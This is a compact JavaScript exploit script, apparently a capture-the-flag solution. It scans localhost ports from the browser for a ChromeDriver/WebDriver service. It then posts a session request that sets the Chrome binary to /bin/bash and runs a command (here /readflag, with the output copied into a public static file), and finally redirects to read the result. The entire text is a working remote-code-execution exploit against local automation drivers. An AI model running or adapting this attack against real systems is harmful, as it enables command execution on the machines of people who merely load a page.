const RANGES=[[9515,9999],[32768,60999],[4444,4500]];
const BODY=JSON.stringify({capabilities:{alwaysMatch:{"goog:chromeOptions":{binary:"/bin/bash",args:["-c","/readflag>/app/static/f.txt 2>&1;chmod 644 /app/static/f.txt"]}}}});
async function portAlive(port){try{await fetch(`http://127.0.0.1:${port}/status`,{mode:"no-cors",signal:AbortSignal.timeout(50)});return true}catch{return false}}
async function fire(port){try{await fetch(`http://127.0.0.1:${port}/session`,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:BODY,signal:AbortSignal.timeout(150)})}catch{}}
async function run(){const hits=[];for(const[start,end]of RANGES){let batch=[];for(let port=start;port<=end;port++){batch.push(portAlive(port).then(ok=>ok&&hits.push(port)));if(batch.length===1024){await Promise.allSettled(batch);batch=[]}}await Promise.allSettled(batch);if(hits.length)break}await Promise.allSettled(hits.map(fire));setTimeout(()=>location='/static/f.txt',2500)}
run().catch(()=>{});
